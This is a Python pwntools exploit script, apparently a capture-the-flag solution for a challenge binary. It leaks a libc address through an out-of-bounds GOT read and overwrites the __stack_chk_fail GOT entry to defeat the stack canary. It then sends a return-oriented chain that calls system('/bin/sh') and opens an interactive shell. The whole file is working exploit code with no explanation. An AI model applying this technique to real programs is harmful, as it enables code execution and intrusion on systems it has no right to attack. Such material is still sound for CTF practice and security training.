#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    idx = (exe.got["puts"] - exe.sym["arr"]) // 8
    io.sendlineafter(b">>", str(idx).encode())
    data = io.recvline().split(b" ")[2]
    puts = int(data, 16)
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    io.sendlineafter(b">>", str(hex(exe.got["__stack_chk_fail"])).encode())
    io.sendlineafter(b">>", str(ret).encode())

    io.sendlineafter(b":", b"200")

    offset = 40
    payload = flat({
        offset: [
            b"A"*8,
            b"B"*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload.ljust(200, b"."))


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
